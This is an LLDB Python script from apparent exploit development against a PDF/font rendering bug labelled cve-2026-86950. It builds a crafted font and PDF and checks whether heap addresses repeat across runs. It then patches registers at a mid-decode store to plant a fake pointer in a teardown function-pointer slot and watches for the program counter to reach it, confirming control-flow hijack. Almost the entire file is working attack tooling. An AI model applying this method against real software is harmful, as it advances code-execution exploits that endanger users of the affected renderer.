# RIP-33: TEARDOWN PROVENANCE + DETERMINISM + ARMED PATCH.
# A: bp data_release_info (clean run): disasm entry..+48 -> find x8 ldr -> slot addr+value. Report obj.
# B: SECOND clean run: same capture -> compare obj/slot addresses (heap determinism).
# C: if deterministic: THIRD run: bp +2540 (mid-decode stores) -> patch x2=slot, x0=FAKEPTR
#    at every store stop after #50 -> teardown blraaz -> watch PC==FAKEPTR.
import os, sys, struct, time, subprocess
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
TRACE = open(os.path.join(CWD, "rip34_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()
FAKEPTR = 0x515100000
subprocess.run(['./venv/bin/python', '-c',
    "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_s1000.ttf', 1000)"],
    cwd=CVE, capture_output=True)
subprocess.run(['./venv/bin/python', 'gen_pdf.py', 'k2_s1000.pdf', 'k2_s1000.ttf'], cwd=CVE, capture_output=True)
PDF = "k2_s1000.pdf"

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.5)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0

def disasm_at(addr, n):
    out = []
    try:
        for ins in t.ReadInstructions(lldb.SBAddress(addr, t), n):
            out.append("+%x %s %s" % (ins.GetAddress().GetLoadAddress(t) - addr,
                                      ins.GetMnemonic(target=t), ins.GetOperands(target=t)))
    except Exception as e:
        out.append("err %s" % e)
    return out

def capture_fin():
    """bp data_release_info in a fresh clean run; return (obj, slotaddr, slotval, disasm)"""
    fresh()
    bf = t.BreakpointCreateByName("data_release_info")
    p = t.LaunchSimple([PDF, "r.png"], None, CVE)
    res = None
    if p and p.IsValid():
        for i in range(80):
            st = wait_stop(p)
            if st != lldb.eStateStopped:
                T("FIN-wait end st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1)); break
            fr = p.GetSelectedThread().GetSelectedFrame()
            nm = "?"
            try: nm = fr.GetSymbol().GetName() or "?"
            except Exception: pass
            if "data_release_info" in nm:
                x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
                pc = safe_pc_addr(fr)
                dis = disasm_at(pc, 14)
                T("FIN x0=%x x8=%x" % (x0, x8))
                for line in dis: T("  %s" % line)
                # find the ldr feeding x8: parse dis for 'ldr x8, [xN, #imm]'
                slotaddr = None
                for line in dis:
                    if line.split(None, 1)[-1].startswith("ldr x8, ["):
                        try:
                            inner = line.split("[")[1].rstrip("]")
                            parts = [s.strip() for s in inner.split(",")]
                            base = parts[0]
                            imm = 0
                            if len(parts) > 1 and "#" in parts[1]:
                                imm = int(parts[1].split("#")[1], 0)
                            bval = reg(fr, base)
                            slotaddr = bval + imm
                            T("FIN x8-slot: %s+%d = %x (val=%x)" % (base, imm, slotaddr, x8))
                        except Exception as e:
                            T("FIN slot parse err %s" % e)
                        break
                res = (x0, slotaddr, x8, dis)
                killp(p); break
            p.Continue()
        killp(p)
    t.BreakpointDelete(bf.GetID())
    return res

T("== A ==")
a = capture_fin()
T("== B ==")
b = capture_fin()
T("A obj=%s" % (hex(a[0]) if a else None))
T("B obj=%s" % (hex(b[0]) if b else None))
det = False
if a and b:
    T("DETERMINISM: obj %s, slot %s" % ("SAME" if a[0] == b[0] else "DIFF", "SAME" if a[1] == b[1] else "DIFF"))
    det = (a[0] == b[0] and a[1] == b[1] and a[1])

if det:
    slot = a[1]
    T("== C armed: slot=%x FAKEPTR=%x ==" % (slot, FAKEPTR))
    fresh()
    bs = t.BreakpointCreateByName("aa_cache_render"); bs.SetOneShot(True)
    p = t.LaunchSimple([PDF, "r.png"], None, CVE)
    if p and p.IsValid():
        th = p.GetSelectedThread()
        pc0 = safe_pc_addr(th.GetSelectedFrame())
        bp_store = t.BreakpointCreateByAddress(pc0 + 2540)
        bf2 = t.BreakpointCreateByName("data_release_info")
        ns = 0; patched = False; result = "no-patch"
        for i in range(900):
            st = wait_stop(p)
            if st != lldb.eStateStopped:
                result = "ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1); break
            fr = p.GetSelectedThread().GetSelectedFrame()
            nm = "?"
            try: nm = fr.GetSymbol().GetName() or "?"
            except Exception: pass
            a2 = safe_pc_addr(fr)
            off = a2 - fr.GetSymbol().GetStartAddress().GetLoadAddress(t) if (a2 and fr.GetSymbol()) else -1
            if "data_release_info" in nm:
                x8 = reg(fr, "x8"); x0 = reg(fr, "x0")
                T("C FIN x0=%x x8=%x %s" % (x0, x8, "HIJACKED!" if (x8 & 0xFFFFFFFFFF) == FAKEPTR else ""))
                if (x8 & 0xFFFFFFFFFF) == FAKEPTR:
                    # continue INTO the blraaz -> watch PC
                    p.Continue()
                    continue
                killp(p); break
            if off == 2540:
                ns += 1
                if ns >= 50:
                    x2r = fr.FindRegister("x2"); x0r = fr.FindRegister("x0")
                    x2r.SetValueFromCString("0x%x" % slot)
                    x0r.SetValueFromCString("0x%x" % FAKEPTR)
                    patched = True
                    if ns % 100 == 0: T("C patching store#%d" % ns)
                p.Continue()
            else:
                pc = safe_pc_addr(fr) or 0
                desc = p.GetSelectedThread().GetStopDescription(300) or ""
                if (pc & 0xFFFFFFFFFF) == FAKEPTR:
                    result = "PC-CONTROL-CONFIRMED pc=%x" % pc
                    T("C %s" % result); killp(p); break
                if "EXC_BAD_ACCESS" in desc:
                    fa = 0
                    if "address=" in desc:
                        try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                        except Exception: pass
                    T("C fault pc=%x fa=%x %s" % (pc, fa, desc[:60]))
                    if (fa & 0xFFFFFFFFFF) == FAKEPTR:
                        result = "PC-CONTROL-CONFIRMED fault-at-FAKEPTR"
                        killp(p); break
                p.Continue()
        killp(p)
        T("C result: %s (stores=%d patched=%s)" % (result, ns, patched))
else:
    T("C SKIPPED (non-deterministic or no slot)")
T("RIP-34 DONE")
TRACE.close()
